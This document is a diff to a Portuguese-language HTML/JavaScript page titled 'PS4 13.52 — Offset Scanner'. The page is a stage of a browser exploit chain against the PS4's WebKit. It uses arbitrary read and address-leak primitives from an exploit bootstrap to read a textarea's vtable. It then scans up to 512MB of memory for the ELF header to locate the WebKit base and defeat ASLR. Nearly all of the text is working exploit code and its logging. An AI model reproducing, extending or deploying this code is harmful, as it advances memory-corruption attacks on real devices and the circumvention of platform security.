@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
 <meta charset="utf-8">
-<title>PS4 WebKit — Base Finder (v3 OOM-Safe)</title>
+<title>PS4 13.52 — Offset Scanner</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   html, body { height: 100%; background: #0b0f19; color: #c8ced8;
@@ -17,9 +17,9 @@
     font-family: monospace; font-size: 10px; border-bottom: 1px solid #1f2937; }
   .row:last-child { border-bottom: none; }
   .label { color: #9ca3af; } .value { color: #60a5fa; font-weight: bold; }
-  #log { width: 95%; max-width: 720px; height: 160px; background: #111827;
-    border: 1px solid #1f2937; border-radius: 6px; padding: 6px;
-    overflow-y: auto; font-family: monospace; font-size: 10px; color: #9fb1c3; }
+  #log { width: 95%; max-width: 720px; height: 180px; background: #111827;
+    border: 1px solid #1f2937; border-radius: 6px; padding: 5px;
+    overflow-y: auto; font-family: monospace; font-size: 9px; color: #9fb1c3; }
   #log .ok { color: #4ade80; } #log .err { color: #f87171; }
   #log .found { color: #a78bfa; font-weight: bold; }
   #log .warn { color: #fbbf24; }
@@ -35,13 +35,13 @@
   input[type="text"] {
     background: #1f2937; border: 1px solid #374151; color: #fff;
     border-radius: 3px; padding: 4px 5px; font-family: monospace; font-size: 10px;
-    width: 100px;
+    width: 90px;
   }
   .flex-row { display: flex; gap: 5px; flex-wrap: wrap; justify-content: center; align-items: center; }
 </style>
 </head>
 <body>
-<h1>PS4 WebKit — Base Finder (v3 OOM-Safe)</h1>
+<h1>PS4 13.52 — Offset Scanner</h1>
 <div id="status">Inicializando...</div>
 
 <div class="section">Valores</div>
@@ -49,23 +49,24 @@
   <div class="row"><span class="label">__ps5NativeCtor:</span><span class="value" id="l-ctor">---</span></div>
   <div class="row"><span class="label">vtable ptr (0x10):</span><span class="value" id="l-vt">---</span></div>
   <div class="row"><span class="label">vtable[0]:</span><span class="value" id="l-vt0">---</span></div>
+  <div class="row"><span class="label">Min vtable addr:</span><span class="value" id="l-min">---</span></div>
   <div class="row"><span class="label">Base:</span><span class="value" id="l-base">---</span></div>
 </div>
 
 <div class="hint">
-  v3: Log limitado a 25 linhas. Brute force loga a cada 512 blocos. Sem OOM.
+  v4: Reutiliza 1 int64 no loop (sem OOM). Scan ate 512MB. VTable Analyzer incluido.
 </div>
 
 <div class="section">Acoes</div>
 <div class="flex-row">
   <button class="ctrl-btn success" onclick="scanVtable()">🔎 Ler VTable</button>
-  <button class="ctrl-btn gold" onclick="bruteForceCtor()">💥 BF Ctor</button>
-  <button class="ctrl-btn danger" onclick="bruteForceVtable()">💥 BF VTable</button>
-  <button class="ctrl-btn" onclick="testVtableOffsets()">🎯 Offsets VTable[0]</button>
+  <button class="ctrl-btn gold" onclick="analyzeVtable()">📊 VTable Analyzer</button>
+  <button class="ctrl-btn danger" onclick="megaScan()">💥 Mega Scan (512MB)</button>
+  <button class="ctrl-btn" onclick="scanFromMin()">🎯 Scan do Min Addr</button>
   <button class="ctrl-btn" onclick="clearLog()">🗑️ Limpar</button>
 </div>
 
-<div class="section">Offset do Ctor</div>
+<div class="section">Offset Customizado</div>
 <div class="flex-row">
   <input type="text" id="custom-off" placeholder="0x3A888" value="0x3A888">
   <button class="ctrl-btn" onclick="testCustomOffset()">Testar</button>
@@ -86,13 +87,14 @@
     line.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
     logBox.appendChild(line);
     logBox.scrollTop = logBox.scrollHeight;
-    while (logBox.children.length > 25) logBox.removeChild(logBox.firstChild);
+    while (logBox.children.length > 20) logBox.removeChild(logBox.firstChild);
   }
   window.clearLog = function() { logBox.innerHTML = ""; log("Log limpo."); };
 
   let ctorInt64 = null;
   let vtablePtr = null;
   let vtable0 = null;
+  let minVtableAddr = null;
   let running = false;
 
   function setRunning(v) {
@@ -104,10 +106,6 @@
     const low  = (num % 0x100000000) >>> 0;
     const hi   = (Math.floor(num / 0x100000000)) >>> 0;
     return new int64(low, hi);
-  }
-
-  function align16k(addr) {
-    return addr.and64(0xFFFFC000, 0xFFFFFFFF);
   }
 
   function int64ToNum(addr) {
@@ -126,35 +124,38 @@
     try { return p.read8(addr); } catch (e) { return null; }
   }
 
-  async function testBase(addr, label) {
-    const p = window.p;
-    if (!p) return false;
-    log("=== " + label + " => 0x" + addr.toString(16) + " ===", "warn");
-    const magic = safeRead4(p, addr);
-    if (magic === null) { log("  read falhou", "err"); return false; }
-    const magicU = magic >>> 0;
-    log("  Magic: 0x" + magicU.toString(16).padStart(8,"0"), magicU === 0x464c457f ? "found" : "info");
-    if (magicU === 0x464c457f) {
-      log("✅ BASE! 0x" + addr.toString(16), "found");
-      window.__webkitBase = addr;
-      document.getElementById("l-base").textContent = "0x" + addr.toString(16);
-      status.textContent = "BASE: 0x" + addr.toString(16);
-      status.style.color = "#4ade80";
-      return true;
+  // ============================================================
+  // OOM-SAFE: Reutiliza 1 int64, nao cria novos objetos no loop
+  // ============================================================
+  function subInPlace(addr, val) {
+    // addr.low -= val, com borrow
+    if (addr.low < val) {
+      addr.low = (0x100000000 + addr.low) - val;
+      addr.hi = (addr.hi - 1) >>> 0;
+    } else {
+      addr.low = (addr.low - val) >>> 0;
     }
-    return false;
   }
 
+  function cloneAddr(addr) {
+    return new int64(addr.low, addr.hi);
+  }
+
+  // ============================================================
+  // LER VTABLE
+  // ============================================================
   window.scanVtable = async function() {
     const p = window.p;
     if (!p) { log("p nao disponivel", "err"); return; }
     log("Lendo vtable...", "warn");
+
     const textArea = document.createElement("textarea");
     const objAddr = p.leakval(textArea);
     const vtPtr = safeRead8(p, objAddr.add32(0x10));
     if (!vtPtr) { log("Falha vtable ptr", "err"); return; }
     vtablePtr = vtPtr;
     document.getElementById("l-vt").textContent = "0x" + vtPtr.toString(16);
+
     const v0 = safeRead8(p, vtPtr);
     if (!v0) { log("Falha vtable[0]", "err"); return; }
     vtable0 = v0;
@@ -162,139 +163,174 @@
     log("vt=0x" + vtPtr.toString(16) + " v0=0x" + v0.toString(16), "ok");
   };
 
-  window.bruteForceCtor = async function() {
-    if (running) return;
-    const p = window.p;
-    if (!p || !ctorInt64) { log("Ctor nao pronto", "err"); return; }
-    setRunning(true);
-    log("BF Ctor (64MB max)...", "warn");
-    const step = 0x4000;
-    const maxDist = 0x4000000;
-    let current = align16k(ctorInt64);
-    const end = ctorInt64.sub32(maxDist);
-    let tested = 0;
-    try {
-      for (;;) {
-        if (current.hi < end.hi || (current.hi === end.hi && current.low < end.low)) {
-          log("Limite 64MB", "err"); break;
-        }
-        const magic = safeRead4(p, current);
-        if (magic !== null && (magic >>> 0) === 0x464c457f) {
-          log("✅ BASE! 0x" + current.toString(16), "found");
-          window.__webkitBase = current;
-          document.getElementById("l-base").textContent = "0x" + current.toString(16);
-          status.textContent = "BASE: 0x" + current.toString(16);
-          status.style.color = "#4ade80";
-          const off = int64ToNum(ctorInt64) - int64ToNum(current);
-          log("Ctor offset = 0x" + off.toString(16), "found");
-          setRunning(false); return;
-        }
-        tested++;
-        current = current.sub32(step);
-        if (tested % 512 === 0) {
-          log("Prog: " + tested + " blocos, 0x" + current.toString(16), "info");
-          await new Promise(r => setTimeout(r, 10));
-        }
-      }
-    } catch (e) { log("Exc: " + e.message, "err"); }
-    log("BF Ctor fim", "err");
-    setRunning(false);
-  };
-
-  window.bruteForceVtable = async function() {
-    if (running) return;
+  // ============================================================
+  // VTABLE ANALYZER — le 64 entradas, acha min/max
+  // ============================================================
+  window.analyzeVtable = async function() {
     const p = window.p;
     if (!p || !vtablePtr) { log("Clique Ler VTable primeiro", "err"); return; }
-    setRunning(true);
-    log("BF VTable (64MB max)...", "warn");
-    const step = 0x4000;
-    const maxDist = 0x4000000;
-    let current = align16k(vtablePtr);
-    const end = vtablePtr.sub32(maxDist);
-    let tested = 0;
-    try {
-      for (;;) {
-        if (current.hi < end.hi || (current.hi === end.hi && current.low < end.low)) {
-          log("Limite 64MB", "err"); break;
-        }
-        const magic = safeRead4(p, current);
-        if (magic !== null && (magic >>> 0) === 0x464c457f) {
-          log("✅ BASE! 0x" + current.toString(16), "found");
-          window.__webkitBase = current;
-          document.getElementById("l-base").textContent = "0x" + current.toString(16);
-          status.textContent = "BASE: 0x" + current.toString(16);
-          status.style.color = "#4ade80";
-          const off = int64ToNum(vtablePtr) - int64ToNum(current);
-          log("VTable ptr offset = 0x" + off.toString(16), "found");
-          setRunning(false); return;
-        }
-        tested++;
-        current = current.sub32(step);
-        if (tested % 512 === 0) {
-          log("Prog: " + tested + " blocos, 0x" + current.toString(16), "info");
-          await new Promise(r => setTimeout(r, 10));
-        }
+    log("=== VTable Analyzer ===", "warn");
+
+    let minAddr = null;
+    let maxAddr = null;
+    let validCount = 0;
+    const ptrs = [];
+
+    for (let i = 0; i < 64; i++) {
+      const slot = safeRead8(p, vtablePtr.add32(i * 8));
+      if (!slot) continue;
+      const n = int64ToNum(slot);
+      if (n >= 0x800000000 && n < 0x900000000) {
+        validCount++;
+        ptrs.push({ idx: i, addr: "0x" + slot.toString(16), num: n });
+        if (minAddr === null || n < minAddr) minAddr = n;
+        if (maxAddr === null || n > maxAddr) maxAddr = n;
       }
-    } catch (e) { log("Exc: " + e.message, "err"); }
-    log("BF VTable fim", "err");
-    setRunning(false);
+    }
+
+    log("Entradas validas: " + validCount + "/64", "ok");
+    if (minAddr !== null) {
+      log("Min addr: 0x" + minAddr.toString(16), "ok");
+      log("Max addr: 0x" + maxAddr.toString(16), "ok");
+      log("Range: " + ((maxAddr - minAddr) / 0x100000).toFixed(1) + "MB", "ok");
+
+      // Estimativa: a base provavelmente esta entre minAddr - 5MB e minAddr
+      const estBaseLow = minAddr - 0x500000;
+      log("Estimativa base: 0x" + estBaseLow.toString(16) + " .. 0x" + minAddr.toString(16), "warn");
+
+      minVtableAddr = numToInt64(minAddr);
+      document.getElementById("l-min").textContent = "0x" + minVtableAddr.toString(16);
+    }
+
+    // Mostrar primeiras 8 entradas validas
+    for (let i = 0; i < Math.min(8, ptrs.length); i++) {
+      log("[" + ptrs[i].idx + "] " + ptrs[i].addr, "info");
+    }
   };
 
   // ============================================================
-  // TESTAR OFFSETS COMUNS A PARTIR DO VTABLE[0]
+  // MEGA SCAN — 512MB max, OOM-safe (reutiliza int64)
   // ============================================================
-  window.testVtableOffsets = async function() {
+  window.megaScan = async function() {
     if (running) return;
     const p = window.p;
     if (!p || !vtable0) { log("Clique Ler VTable primeiro", "err"); return; }
     setRunning(true);
-    log("Testando offsets do vtable[0]...", "warn");
 
-    // Offsets comuns do PS5 + alguns extras
-    const offsets = [
-      0x100000, 0x200000, 0x300000, 0x400000,
-      0x500000, 0x600000, 0x700000, 0x800000,
-      0x900000, 0xA00000, 0xB00000, 0xC00000,
-      0xD00000, 0xE00000, 0xF00000, 0x1000000,
-      0x1200000, 0x1400000, 0x1600000, 0x1800000,
-      0x1A00000, 0x1C00000, 0x1E00000, 0x2000000,
-      0x2200000, 0x2400000, 0x2600000, 0x2800000,
-    ];
+    log("=== Mega Scan (512MB) ===", "warn");
+    log("v0=0x" + vtable0.toString(16), "info");
 
-    for (const off of offsets) {
-      const base = align16k(vtable0.sub32(off));
-      if (!isValidPtr(base)) continue;
-      log("vt[0]-0x" + off.toString(16) + " => 0x" + base.toString(16), "info");
-      const magic = safeRead4(p, base);
-      if (magic !== null && (magic >>> 0) === 0x464c457f) {
-        log("✅ BASE! 0x" + base.toString(16), "found");
-        window.__webkitBase = base;
-        document.getElementById("l-base").textContent = "0x" + base.toString(16);
-        status.textContent = "BASE: 0x" + base.toString(16);
-        status.style.color = "#4ade80";
-        log("Offset vtable[0] = 0x" + off.toString(16), "found");
-        setRunning(false); return;
+    const step = 0x4000; // 16KB
+    const maxDist = 0x20000000; // 512MB
+    const addr = cloneAddr(vtable0); // Reutilizamos este objeto!
+    let tested = 0;
+    let lastYield = 0;
+
+    try {
+      for (let dist = 0; dist < maxDist; dist += step) {
+        const magic = safeRead4(p, addr);
+        if (magic !== null && (magic >>> 0) === 0x464c457f) {
+          log("✅ BASE! 0x" + addr.toString(16), "found");
+          log("Offset vtable[0] = 0x" + dist.toString(16) + " (" + dist + ")", "found");
+          window.__webkitBase = cloneAddr(addr);
+          document.getElementById("l-base").textContent = "0x" + addr.toString(16);
+          status.textContent = "BASE: 0x" + addr.toString(16);
+          status.style.color = "#4ade80";
+          setRunning(false);
+          return;
+        }
+
+        tested++;
+        subInPlace(addr, step);
+
+        // Yield a cada 1024 iteracoes + log
+        if (tested - lastYield >= 1024) {
+          log("Prog: " + tested + " blocos, 0x" + addr.toString(16), "info");
+          lastYield = tested;
+          await new Promise(r => setTimeout(r, 10));
+        }
       }
-      await new Promise(r => setTimeout(r, 5));
-    }
-    log("Nenhum offset comum funcionou.", "err");
+    } catch (e) { log("Exc: " + e.message, "err"); }
+
+    log("Mega Scan terminou (512MB). Nada encontrado.", "err");
     setRunning(false);
   };
 
+  // ============================================================
+  // SCAN A PARTIR DO MIN ADDR DO VTABLE
+  // ============================================================
+  window.scanFromMin = async function() {
+    if (running) return;
+    const p = window.p;
+    if (!p || !minVtableAddr) { log("Clique VTable Analyzer primeiro", "err"); return; }
+    setRunning(true);
+
+    log("=== Scan do Min Addr ===", "warn");
+    log("Min=0x" + minVtableAddr.toString(16), "info");
+
+    const step = 0x4000;
+    const maxDist = 0x1000000; // 16MB abaixo do min
+    const addr = cloneAddr(minVtableAddr);
+    let tested = 0;
+
+    try {
+      for (let dist = 0; dist < maxDist; dist += step) {
+        const magic = safeRead4(p, addr);
+        if (magic !== null && (magic >>> 0) === 0x464c457f) {
+          log("✅ BASE! 0x" + addr.toString(16), "found");
+          log("Offset do min = 0x" + dist.toString(16), "found");
+          window.__webkitBase = cloneAddr(addr);
+          document.getElementById("l-base").textContent = "0x" + addr.toString(16);
+          status.textContent = "BASE: 0x" + addr.toString(16);
+          status.style.color = "#4ade80";
+          setRunning(false);
+          return;
+        }
+        tested++;
+        subInPlace(addr, step);
+        if (tested % 256 === 0) {
+          log("Prog: " + tested + ", 0x" + addr.toString(16), "info");
+          await new Promise(r => setTimeout(r, 5));
+        }
+      }
+    } catch (e) { log("Exc: " + e.message, "err"); }
+
+    log("Scan do Min terminou.", "err");
+    setRunning(false);
+  };
+
+  // ============================================================
+  // TESTAR OFFSET CUSTOMIZADO
+  // ============================================================
   window.testCustomOffset = async function() {
     const p = window.p;
     if (!p || !ctorInt64) { log("Primitivas nao prontas", "err"); return; }
     const raw = document.getElementById("custom-off").value;
     const off = parseInt(raw, 16);
     if (isNaN(off)) { log("Offset invalido", "err"); return; }
-    const base = align16k(ctorInt64.sub32(off));
-    const found = await testBase(base, "Custom-0x" + off.toString(16));
-    if (found) {
-      const actualOff = int64ToNum(ctorInt64) - int64ToNum(base);
-      log("Offset real = 0x" + actualOff.toString(16), "found");
+
+    const base = numToInt64(int64ToNum(ctorInt64) - off);
+    // Alinhar
+    base.low = base.low & 0xFFFFC000;
+    log("Offset: 0x" + off.toString(16) + " => base 0x" + base.toString(16), "warn");
+
+    const magic = safeRead4(p, base);
+    if (magic !== null) {
+      const magicU = magic >>> 0;
+      log("Magic: 0x" + magicU.toString(16).padStart(8,"0"), magicU === 0x464c457f ? "found" : "info");
+      if (magicU === 0x464c457f) {
+        log("✅ BASE!", "found");
+        window.__webkitBase = base;
+        document.getElementById("l-base").textContent = "0x" + base.toString(16);
+        status.textContent = "BASE: 0x" + base.toString(16);
+        status.style.color = "#4ade80";
+      }
+    } else {
+      log("Read falhou", "err");
     }
   };
 
+  // BOOTSTRAP
   log("Carregando...", "ok");
   status.textContent = "Executando exploit...";
   establishPrimitive({ onEvent: (tag, detail) => log(tag + ": " + detail, "info") })
